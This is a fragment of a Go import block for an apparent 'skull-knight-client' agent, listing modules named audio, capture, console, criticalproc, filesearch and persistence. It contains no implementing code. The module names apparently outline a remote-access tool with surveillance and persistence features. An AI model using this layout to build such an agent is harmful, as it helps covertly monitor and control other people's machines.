...
import (
	...
	"skull-knight-client/cmd/agent/audio"
	"skull-knight-client/cmd/agent/capture"
	"skull-knight-client/cmd/agent/console"
	"skull-knight-client/cmd/agent/criticalproc"
	"skull-knight-client/cmd/agent/filesearch"
	"skull-knight-client/cmd/agent/persistence"
